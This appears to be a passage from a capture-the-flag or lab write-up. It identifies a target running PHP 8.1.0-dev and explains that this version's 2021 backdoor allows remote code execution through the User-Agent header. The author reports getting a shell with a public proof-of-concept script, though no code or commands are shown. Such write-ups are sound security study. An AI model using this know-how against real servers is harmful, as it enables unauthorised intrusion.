Bingo - PHP 8.1.0-dev - that looks promising.

Exploitation

PHP verion 8.1.0-dev was released with a backdoor in March 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agent header. With a POC script from exploit-db we get access to a shell.
